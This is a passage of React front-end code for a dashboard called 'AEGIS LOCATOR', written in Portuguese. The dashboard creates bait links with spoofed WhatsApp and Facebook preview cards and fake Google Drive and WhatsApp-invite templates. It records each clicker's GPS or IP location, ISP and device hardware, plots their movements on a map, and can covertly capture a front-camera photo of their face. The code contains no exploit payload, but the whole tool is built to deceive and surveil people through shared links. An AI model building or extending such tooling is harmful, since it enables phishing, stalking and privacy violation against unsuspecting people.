              <div style={{ background:'rgba(0,218,255,0.05)', border:'1px solid rgba(0,218,255,0.3)', borderRadius:'4px', padding:'12px 15px', marginBottom:'20px' }}>
                <div style={{ fontSize:'0.65rem', color:'var(--text-muted)', fontFamily:'var(--font-mono)', marginBottom:'5px' }}>URL DO OPERADOR (acesso de qualquer dispositivo)</div>
                <div style={{ fontFamily:'var(--font-mono)', color:'var(--neon-blue)', fontSize:'0.72rem', wordBreak:'break-all', marginBottom:'8px' }}>{operatorUrl}</div>
                <button onClick={() => { navigator.clipboard.writeText(operatorUrl); }} style={{ background:'transparent', border:'1px solid var(--neon-blue)', color:'var(--neon-blue)', padding:'4px 12px', fontSize:'0.72rem', cursor:'pointer', fontFamily:'var(--font-mono)', borderRadius:'2px', display:'flex', alignItems:'center', gap:'5px' }}>
                  <Copy size={12}/> Copiar URL do Operador
                </button>
              </div>
            )}

            {campaignExpiry && (
              <p style={{ fontSize:'0.75rem', color:'var(--text-muted)', marginBottom:'18px', fontFamily:'var(--font-mono)' }}>
                ⏱ Campanha expira em: <span style={{ color:'var(--neon-alert)' }}>{campaignExpiry}</span>
              </p>
            )}

            <button
              onClick={() => setShowKeyModal(false)}
              className="cyber-button"
              style={{ width:'100%' }}
            >
              ✅ Entendi — Guardei a Chave
            </button>
          </div>
        </div>
      )}

      {/* Header bar */}
      <header style={{
        background: 'var(--bg-dark)',
        borderBottom: '1px solid var(--border-glow)',
        padding: '15px 30px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        boxShadow: '0 5px 20px rgba(0,0,0,0.5)',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <div style={{
            background: 'rgba(0, 255, 102, 0.1)',
            border: '1px solid var(--neon-green)',
            padding: '8px',
            borderRadius: '4px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            boxShadow: '0 0 10px rgba(0, 255, 102, 0.2)'
          }}>
            <Shield size={24} className="text-neon" style={{ color: 'var(--neon-green)' }} />
          </div>
          <div>
            <h1 style={{ 
              fontFamily: 'var(--font-display)', 
              fontSize: '1.25rem', 
              color: 'var(--text-main)',
              letterSpacing: '3px',
              textTransform: 'uppercase',
              margin: 0,
              textShadow: '0 0 10px rgba(0, 255, 102, 0.3)'
            }}>
              AEGIS LOCATOR <span style={{ color: 'var(--neon-blue)', fontSize: '0.8rem' }}>v3.5</span>
            </h1>
            <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
              INVESTIGATION MODULE // GPS & IP FALLBACK
            </p>
          </div>
        </div>

        {/* Tab Navigation */}
        <div style={{ display: 'flex', gap: '15px' }}>
          <button 
            className={`cyber-button ${activeTab === 'creation' ? 'active' : 'cyber-button-blue'}`}
            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
            onClick={() => setActiveTab('creation')}
          >
            1. Criador de Link
          </button>
          <button 
            className={`cyber-button ${activeTab === 'monitor' ? 'active' : 'cyber-button-blue'}`}
            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
            onClick={() => {
              setActiveTab('monitor');
              addLog('Console de Monitoramento ativado.', 'info');
            }}
          >
            2. Monitor de Alvos ({targets.length})
          </button>
          <button 
            className={`cyber-button ${activeTab === 'history' ? 'active' : 'cyber-button-blue'}`}
            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
            onClick={() => {
              setActiveTab('history');
              addLog('Acessando Histórico de Campanhas.', 'info');
            }}
          >
            3. Histórico
          </button>
        </div>
      </header>

      {/* Main Content Layout */}
      <main style={{ 
        flex: 1, 
        display: 'grid', 
        gridTemplateColumns: '360px 1fr', 
        gap: '20px', 
        padding: '20px',
        maxWidth: '1600px',
        width: '100%',
        margin: '0 auto',
      }}>
        
        {/* LEFT COLUMN: Controls & Logs */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', overflow: 'hidden' }}>
          
          {/* Panel 1: Context Mode Options */}
          {activeTab === 'creation' && (
            <div className="cyber-panel cyber-panel-blue">
              <div className="cyber-title blue">
                <UploadCloud size={18} />
                Upload de Mídia
              </div>
              
              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '15px' }}>
                Hospede uma imagem ou meme para usar como isca. O WhatsApp/Facebook usará este arquivo para o Preview do link.
              </p>

              {/* Upload drag zone */}
              <div style={{
                border: '2px dashed rgba(0, 218, 255, 0.3)',
                borderRadius: '4px',
                padding: '20px',
                textAlign: 'center',
                cursor: 'pointer',
                background: 'rgba(0, 218, 255, 0.02)',
                position: 'relative',
                transition: 'all 0.3s ease',
                marginBottom: '15px'
              }}
              onDragOver={e => e.preventDefault()}
              onDrop={e => {
                e.preventDefault();
                const file = e.dataTransfer.files[0];
                if (file) {
                  setImageFile(file);
                  const reader = new FileReader();
                  reader.onloadend = () => setImagePreview(reader.result);
                  reader.readAsDataURL(file);
                }
              }}
              >
                <input 
                  type="file" 
                  accept="image/*" 
                  id="image-uploader" 
                  style={{ display: 'none' }}
                  onChange={handleImageChange}
                />
                <label htmlFor="image-uploader" style={{ cursor: 'pointer', display: 'block' }}>
                  {imagePreview ? (
                    <img 
                      src={imagePreview} 
                      alt="Preview upload" 
                      style={{ maxWidth: '100%', maxHeight: '120px', borderRadius: '4px', border: '1px solid rgba(0, 218, 255, 0.5)' }} 
                    />
                  ) : (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
                      <UploadCloud size={32} style={{ color: 'var(--neon-blue)' }} />
                      <span style={{ fontSize: '0.85rem', color: 'var(--text-main)' }}>Clique ou Arraste a Imagem</span>
                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Formatos suportados: PNG, JPG, GIF</span>
                    </div>
                  )}
                </label>
              </div>

              {/* Card Meta configuration */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginBottom: '15px' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
                    TÍTULO DO CARD (og:title)
                  </label>
                  <input 
                    type="text" 
                    value={title} 
                    onChange={e => setTitle(e.target.value)}
                    style={{
                      width: '100%',
                      background: 'rgba(5, 8, 17, 0.8)',
                      border: '1px solid rgba(0, 218, 255, 0.3)',
                      color: '#fff',
                      padding: '8px 12px',
                      borderRadius: '4px',
                      fontSize: '0.85rem',
                      fontFamily: 'var(--font-sans)'
                    }}
                  />
                </div>
                <div>
                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
                    DESCRIÇÃO (og:description)
                  </label>
                  <textarea 
                    value={description} 
                    onChange={e => setDescription(e.target.value)}
                    rows={2}
                    style={{
                      width: '100%',
                      background: 'rgba(5, 8, 17, 0.8)',
                      border: '1px solid rgba(0, 218, 255, 0.3)',
                      color: '#fff',
                      padding: '8px 12px',
                      borderRadius: '4px',
                      fontSize: '0.85rem',
                      fontFamily: 'var(--font-sans)',
                      resize: 'none'
                    }}
                  />
                </div>

                <div>
                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
                    TEMPLATE DA ISCA (HONEY TRAP)
                  </label>
                  <select 
                    value={template} 
                    onChange={e => setTemplate(e.target.value)}
                    style={{
                      width: '100%',
                      background: 'rgba(5, 8, 17, 0.8)',
                      border: '1px solid rgba(0, 218, 255, 0.3)',
                      color: '#fff',
                      padding: '8px 12px',
                      borderRadius: '4px',
                      fontSize: '0.85rem',
                      fontFamily: 'var(--font-sans)',
                      cursor: 'pointer'
                    }}
                  >
                    <option value="default">Cadeado de Imagem Confidencial (Padrão)</option>
                    <option value="gdrive">Google Drive Falso (Exige Clique no Download)</option>
                    <option value="whatsapp">Convite de Grupo WhatsApp (Exige Clique em Entrar)</option>
                  </select>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '5px' }}>
                  <input 
                    type="checkbox" 
                    id="requireCamera" 
                    checked={requireCamera} 
                    onChange={e => setRequireCamera(e.target.checked)}
                    style={{ accentColor: 'var(--neon-alert)', cursor: 'pointer', width: '16px', height: '16px' }}
                  />
                  <label htmlFor="requireCamera" style={{ fontSize: '0.8rem', color: 'var(--neon-alert)', cursor: 'pointer', fontWeight: 'bold' }}>
                    🚨 Exigir Verificação Facial (Captura câmera frontal)
                  </label>
                </div>
              </div>

              <button
                className="cyber-button cyber-button-blue"
                style={{ width: '100%', opacity: isGenerating ? 0.7 : 1, cursor: isGenerating ? 'not-allowed' : 'pointer' }}
                onClick={handleGenerateLink}
                disabled={isGenerating}
              >
                {isGenerating ? 'Enviando...' : 'Gerar Link Isca'}
              </button>
            </div>
          )}

          {activeTab === 'history' && (
            <div className="cyber-panel cyber-panel-blue">
              <div className="cyber-title blue">
                <RefreshCw size={18} />
                Navegação
              </div>
              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>
                Selecione uma campanha à direita para restaurar o estado completo.
              </p>
              <button 
                className="cyber-button"
                style={{ width: '100%', marginTop: '15px', border: '1px solid var(--neon-alert)', color: 'var(--neon-alert)' }}
                onClick={() => {
                  if(window.confirm('Tem certeza que deseja apagar o histórico local? As campanhas no servidor continuarão existindo.')) {
                    setCampaignIndex([]);
                    addLog('Histórico local apagado.', 'system');
                  }
                }}
              >
                Limpar Histórico Local
              </button>
            </div>
          )}

          {activeTab === 'monitor' && (
            <div className="cyber-panel">
              <div className="cyber-title">
                <MapPin size={18} />
                Lista de Alvos
              </div>
              
              <div style={{ 
                maxHeight: '280px', 
                overflowY: 'auto', 
                display: 'flex', 
                flexDirection: 'column', 
                gap: '8px',
                paddingRight: '5px' 
              }}>
                {targets.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: '30px 10px', color: 'var(--text-muted)', fontSize: '0.85rem' }}>
                    Nenhum alvo capturado ainda.
                    <div style={{ marginTop: '10px', fontSize: '0.75rem' }}>Use o "Simulador de Acesso" no painel principal para testar!</div>
                  </div>
                ) : (
                  targets.map(target => (
                    <div 
                      key={target.id}
                      onClick={() => {
                        setSelectedTarget(target);
                        setCurrentCoords(target.coords);
                        setMapZoom(target.method === 'GPS' ? 16 : 12);
                        addLog(`Visualizando alvo [${target.id}] no mapa.`, 'info');
                      }}
                      style={{
                        padding: '10px',
                        background: selectedTarget?.id === target.id ? 'rgba(0, 255, 102, 0.08)' : 'rgba(5, 8, 17, 0.6)',
                        border: `1px solid ${selectedTarget?.id === target.id ? 'var(--neon-green)' : 'rgba(0, 255, 102, 0.15)'}`,
                        borderRadius: '4px',
                        cursor: 'pointer',
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        transition: 'all 0.2s ease'
                      }}
                    >
                      <div>
                        <div style={{ fontWeight: 'bold', fontSize: '0.85rem', color: 'var(--text-main)', fontFamily: 'var(--font-mono)' }}>
                          ID: {target.id}
                        </div>
                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                          {target.city}, {target.region}
                        </div>
                      </div>
                      <span style={{ 
                        fontSize: '0.7rem', 
                        padding: '2px 6px', 
                        background: target.method === 'GPS' ? 'rgba(0, 255, 102, 0.2)' : 'rgba(0, 218, 255, 0.2)',
                        color: target.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)',
                        border: `1px solid ${target.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)'}`,
                        borderRadius: '2px',
                        fontFamily: 'var(--font-mono)'
                      }}>
                        {target.method}
                      </span>
                    </div>
                  ))
                )}
              </div>

              {targets.length > 0 && (
                <button 
                  className="cyber-button"
                  style={{ width: '100%', marginTop: '15px', padding: '6px 12px', fontSize: '0.75rem', border: '1px solid var(--neon-alert)', color: 'var(--neon-alert)' }}
                  onClick={clearDatabase}
                >
                  Limpar Banco de Dados
                </button>
              )}
            </div>
          )}

          {/* Panel 2: Live System Terminal Logs */}
          <div className="cyber-panel" style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: '200px' }}>
            <div className="cyber-title" style={{ fontSize: '0.9rem', marginBottom: '10px' }}>
              <Terminal size={16} />
              Console do Sistema
            </div>
            
            <div style={{
              flex: 1,
              background: 'rgba(5, 8, 17, 0.9)',
              border: '1px solid rgba(0, 255, 102, 0.1)',
              borderRadius: '4px',
              padding: '12px',
              fontFamily: 'var(--font-mono)',
              fontSize: '0.75rem',
              overflowY: 'auto',
              display: 'flex',
              flexDirection: 'column',
              gap: '6px',
            }}>
              {logs.map(log => (
                <div key={log.id} style={{
                  color: log.type === 'success' ? 'var(--neon-green)' : 
                         log.type === 'error' ? 'var(--neon-alert)' : 
                         log.type === 'system' ? 'var(--neon-blue)' : 'var(--text-muted)'
                }}>
                  <span style={{ color: '#555', marginRight: '5px' }}>[{log.time}]</span>
                  <span>{log.text}</span>
                </div>
              ))}
            </div>
          </div>

        </div>

        {/* RIGHT COLUMN: main workspace */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

          {/* If creation tab, show Preview box & Link output */}
          {activeTab === 'creation' && (
            <div className="cyber-panel cyber-panel-blue" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div className="cyber-title blue">
                <Globe size={18} />
                Link Gerado & Social Preview
              </div>

              {/* Output url area */}
              {generatedLink ? (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {/* Link de isca */}
                  <div style={{
                    background: 'rgba(5, 8, 17, 0.8)',
                    border: '1px solid var(--neon-blue)',
                    padding: '12px 15px',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    gap: '15px'
                  }}>
                    <div style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', flex: 1, fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)', fontSize: '0.85rem' }}>
                      {generatedLink}
                    </div>
                    <div style={{ display: 'flex', gap: '8px', flexShrink: 0 }}>
                      <button 
                        onClick={handleCopyLink}
                        style={{
                          background: 'transparent',
                          border: '1px solid var(--neon-blue)',
                          color: 'var(--neon-blue)',
                          padding: '5px 10px',
                          fontSize: '0.75rem',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '5px',
                          fontFamily: 'var(--font-mono)',
                          borderRadius: '2px'
                        }}
                      >
                        {copied ? <Check size={13} /> : <Copy size={13} />}
                        {copied ? 'Copiado' : 'Copiar'}
                      </button>
                      
                      {/* Simulator Trigger */}
                      <button 
                        onClick={triggerSelfTracking}
                        style={{
                          background: 'var(--neon-blue)',
                          border: '1px solid var(--neon-blue)',
                          color: 'var(--bg-darker)',
                          padding: '5px 10px',
                          fontSize: '0.75rem',
                          fontWeight: 'bold',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '5px',
                          fontFamily: 'var(--font-mono)',
                          borderRadius: '2px'
                        }}
                      >
                        <Play size={13} />
                        Testar (Você)
                      </button>
                    </div>
                  </div>

                  {/* Chave secreta do operador */}
                  {activeCampaignKey && (
                    <div style={{
                      background: 'rgba(0, 255, 102, 0.04)',
                      border: '1px solid rgba(0, 255, 102, 0.3)',
                      padding: '10px 15px',
                      borderRadius: '4px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      gap: '10px'
                    }}>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)', marginBottom: '3px' }}>CHAVE SECRETA DO OPERADOR (não compartilhe)</div>
                        <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-green)', fontSize: '0.75rem', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {activeCampaignKey}
                        </div>
                      </div>
                      <button
                        onClick={handleCopyKey}
                        style={{
                          background: 'transparent',
                          border: '1px solid var(--neon-green)',
                          color: 'var(--neon-green)',
                          padding: '5px 10px',
                          fontSize: '0.7rem',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '4px',
                          fontFamily: 'var(--font-mono)',
                          borderRadius: '2px',
                          flexShrink: 0
                        }}
                      >
                        {keyCopied ? <Check size={12} /> : <Copy size={12} />}
                        {keyCopied ? 'Copiada' : 'Copiar'}
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)', border: '1px dashed rgba(0, 218, 255, 0.1)', background: 'rgba(5, 8, 17, 0.4)' }}>
                  Aguardando a criação do link para gerar a visualização.
                </div>
              )}

              {/* Social share preview box */}
              {generatedLink && (
                <div>
                  <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '8px', fontFamily: 'var(--font-mono)' }}>
                    PREVIEW DO LINK EM PLATAFORMAS (WHATSAPP, FACEBOOK, TELEGRAM)
                  </div>
                  <div style={{
                    background: '#0b141a', // WhatsApp web style dark chat background
                    padding: '20px',
                    borderRadius: '8px',
                    maxWidth: '450px',
                    border: '1px solid rgba(0, 218, 255, 0.1)'
                  }}>
                    {/* Chat Bubble mock */}
                    <div style={{
                      background: '#202c33',
                      padding: '8px',
                      borderRadius: '8px',
                      color: '#e9edef',
                      fontSize: '0.9rem',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '5px',
                      boxShadow: '0 1px 0.5px rgba(11,20,26,.13)'
                    }}>
                      {imagePreview && (
                        <img 
                          src={imagePreview} 
                          alt="preview" 
                          style={{ width: '100%', maxHeight: '200px', objectFit: 'cover', borderRadius: '4px 4px 0 0' }}
                        />
                      )}
                      <div style={{
                        background: '#182229',
                        padding: '10px',
                        borderRadius: '0 0 4px 4px',
                        borderLeft: '4px solid var(--neon-blue)'
                      }}>
                        <div style={{ fontWeight: 'bold', fontSize: '0.85rem', color: 'var(--neon-blue)' }}>{title}</div>
                        <div style={{ fontSize: '0.75rem', color: '#8696a0', marginTop: '2px' }}>{description}</div>
                        <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', marginTop: '4px', fontFamily: 'var(--font-mono)' }}>
                          {window.location.hostname}
                        </div>
                      </div>
                      <div style={{ fontSize: '0.85rem', color: '#53bdeb', textDecoration: 'underline', padding: '4px', overflowWrap: 'anywhere' }}>
                        {generatedLink}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Glorious Simulator Controller */}
              <div style={{
                marginTop: '10px',
                border: '1px solid rgba(0, 218, 255, 0.2)',
                background: 'rgba(0, 218, 255, 0.03)',
                padding: '20px',
                borderRadius: '4px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: 'var(--neon-blue)', fontFamily: 'var(--font-display)', fontSize: '0.95rem', marginBottom: '10px' }}>
                  <Activity size={16} />
                  SIMULADOR DE ACESSO DO ALVO (AMBROSIA TESTBED)
                </div>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '15px' }}>
                  Para propósitos de demonstração profissional, simule um clique no link de dispositivos em diferentes locais do mundo. Isso registrará a telemetria no banco de dados em tempo real.
                </p>
                <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('gps_sp')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular GPS: São Paulo (Sucesso GPS)
                  </button>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('ip_rj')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular Recusa GPS: Rio (Fallback IP)
                  </button>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('gps_ny')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular GPS Internacional: New York
                  </button>
                </div>
              </div>

            </div>
          )}

          {/* MAP & LOCATION INFORMATION */}
          {activeTab === 'monitor' && (
            <div style={{ flex: 1, display: 'grid', gridTemplateRows: '1fr auto', gap: '20px' }}>
            
            {/* The Leaflet Map container */}
            <div style={{ height: '450px', position: 'relative' }}>
              <MapContainer 
                center={currentCoords} 
                zoom={mapZoom} 
                style={{ height: '100%', width: '100%', zIndex: 1 }}
                zoomControl={true}
              >
                {/* Cyberpunk Map Tiles using CartoDB Dark Matter */}
                <TileLayer
                  attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>'
                  url="https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
                />
                
                {/* Center view helper */}
                <ChangeView center={currentCoords} zoom={mapZoom} />

                {/* Plot all captured targets (Grouped for Real-time trails) */}
                {Object.values(targets.reduce((acc, t) => {
                  if (!acc[t.id]) acc[t.id] = { ...t, history: [] };
                  acc[t.id].coords = t.coords; // latest
                  acc[t.id].history.push(t.coords);
                  if (t.photoBase64 && !acc[t.id].photoBase64) acc[t.id].photoBase64 = t.photoBase64;
                  if (t.hwTelemetry && !acc[t.id].hwTelemetry) acc[t.id].hwTelemetry = t.hwTelemetry;
                  return acc;
                }, {})).map(target => (
                  <React.Fragment key={target.id}>
                    {target.history.length > 1 && (
                      <Polyline 
                        positions={target.history} 
                        pathOptions={{ color: 'var(--neon-blue)', weight: 3, dashArray: '5, 10', opacity: 0.6 }} 
                      />
                    )}
                    <Marker 
                      position={target.coords} 
                      icon={targetIcon}
                      eventHandlers={{
                        click: () => {
                          setSelectedTarget(target);
                          addLog(`Selecionou alvo [${target.id}] via marcador do mapa.`, 'info');
                        }
                      }}
                    >
                      <Popup>
                        <div style={{ background: '#050811', color: '#fff', padding: '5px', fontSize: '0.8rem', fontFamily: 'monospace' }}>
                          <strong style={{ color: 'var(--neon-green)' }}>ALVO: {target.id}</strong><br/>
                          IP: {target.ip}<br/>
                          Cidade: {target.city}<br/>
                          Método: {target.method}
                        </div>
                      </Popup>
                    </Marker>
                  </React.Fragment>
                ))}

                {/* Plot accuracy circle for selected target */}
                {selectedTarget && selectedTarget.method === 'GPS' && (
                  <Circle 
                    center={selectedTarget.coords}
                    radius={15} // 15 meters
                    pathOptions={{ 
                      color: 'var(--neon-green)', 
                      fillColor: 'var(--neon-green)', 
                      fillOpacity: 0.15,
                      weight: 1,
                      dashArray: '5, 5'
                    }}
                  />
                )}
              </MapContainer>

              {/* Grid overlay aesthetics */}
              <div style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                pointerEvents: 'none',
                border: '1px solid var(--border-glow)',
                boxShadow: 'inset 0 0 30px rgba(0,255,102,0.1)',
                zIndex: 2
              }}>
                {/* Corner crosshairs */}
                <div style={{ position: 'absolute', top: '10px', left: '10px', width: '15px', height: '15px', borderLeft: '2px solid var(--neon-green)', borderTop: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', top: '10px', right: '10px', width: '15px', height: '15px', borderRight: '2px solid var(--neon-green)', borderTop: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', bottom: '10px', left: '10px', width: '15px', height: '15px', borderLeft: '2px solid var(--neon-green)', borderBottom: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', bottom: '10px', right: '10px', width: '15px', height: '15px', borderRight: '2px solid var(--neon-green)', borderBottom: '2px solid var(--neon-green)' }}></div>
              </div>
            </div>

            {/* Target Geodetic Telemetry Summary */}
            <div className="cyber-panel">
              <div className="cyber-title">
                <Compass size={18} />
                Módulo Geodésico & Telemetria do Alvo
              </div>

              {selectedTarget ? (
                <div style={{ 
                  display: 'grid', 
                  gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', 
                  gap: '15px', 
                  fontSize: '0.85rem' 
                }}>
                  
                  {/* Coords & Accuracy */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>COORDENADAS GEOGRÁFICAS</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-green)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.coords[0].toFixed(6)}, {selectedTarget.coords[1].toFixed(6)}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '5px' }}>
                      <Navigation size={12} />
                      Precisão: {selectedTarget.accuracy}
                    </div>
                  </div>

                  {/* Network details */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ENDEREÇO IP & PROVEDOR</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.ip}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '5px' }}>
                      <Wifi size={12} />
                      ISP: {selectedTarget.isp}
                    </div>
                  </div>

                  {/* Geographic Details */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>LOCALIZAÇÃO ESTIMADA</div>
                    <div style={{ fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.city}, {selectedTarget.region} - {selectedTarget.country}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                      Timestamp: {selectedTarget.timestamp}
                    </div>
                  </div>

                  {/* Tracking mechanism & Provider info */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>MÉTODO & PROVEDOR DA API</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: selectedTarget.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.method === 'GPS' ? 'DISPOSITIVO GPS (ATALHO)' : 'BASEADO EM PROVEDOR IP'}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                      Fonte: {selectedTarget.provider}
                    </div>
                  </div>

                  {/* Hardware Telemetry */}
                  {selectedTarget.hwTelemetry && (
                    <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 218, 255, 0.2)', borderRadius: '4px', gridColumn: '1 / -1' }}>
                      <div style={{ fontSize: '0.7rem', color: 'var(--neon-blue)', fontFamily: 'var(--font-mono)', marginBottom: '8px', borderBottom: '1px solid rgba(0,218,255,0.2)', paddingBottom: '4px' }}>TELEMETRIA DE HARDWARE (NÍVEL AVANÇADO)</div>
                      <div style={{ display: 'flex', gap: '15px', flexWrap: 'wrap', fontSize: '0.8rem', color: 'var(--text-main)' }}>
                        <div><strong>Bateria:</strong> {selectedTarget.hwTelemetry.battery} {selectedTarget.hwTelemetry.charging ? '⚡' : ''}</div>
                        <div><strong>RAM:</strong> {selectedTarget.hwTelemetry.ram}</div>
                        <div><strong>CPU:</strong> {selectedTarget.hwTelemetry.cpuCores} núcleos</div>
                        <div><strong>Rede:</strong> {selectedTarget.hwTelemetry.connection}</div>
                        <div><strong>OS:</strong> {selectedTarget.hwTelemetry.platform}</div>
                        <div><strong>Resolução:</strong> {selectedTarget.hwTelemetry.resolution}</div>
                      </div>
                    </div>
                  )}

                  {/* Secret Camera Photo */}
                  {selectedTarget.photoBase64 && (
                    <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid var(--neon-alert)', borderRadius: '4px', gridColumn: '1 / -1', display: 'flex', gap: '15px', alignItems: 'center' }}>
                      <img src={selectedTarget.photoBase64} alt="Target Face" style={{ width: '120px', height: '120px', objectFit: 'cover', borderRadius: '4px', border: '2px solid var(--neon-alert)' }} />
                      <div>
                        <div style={{ fontSize: '0.8rem', color: 'var(--neon-alert)', fontFamily: 'var(--font-mono)', fontWeight: 'bold', marginBottom: '5px' }}>🚨 PROVA FACIAL CAPTURADA</div>
                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>O alvo concedeu permissão de câmera e uma foto instantânea foi extraída com sucesso em background. Identidade confirmada.</div>
                      </div>
                    </div>
                  )}

                </div>
              ) : (
                <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)', fontSize: '0.85rem' }}>
                  Aguardando captação de telemetria. Selecione um alvo ou simule um acesso para exibir os detalhes geodésicos.
                </div>
              )}
            </div>

          </div>
          )}

          {/* If history tab, show History */}
          {activeTab === 'history' && (
            <div className="cyber-panel cyber-panel-blue" style={{ flex: 1, overflowY: 'auto' }}>
              <div className="cyber-title blue" style={{ marginBottom: '20px' }}>
                <RefreshCw size={18} />
                Histórico de Campanhas Criadas
              </div>
              
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '15px' }}>
                {campaignIndex.length === 0 ? (
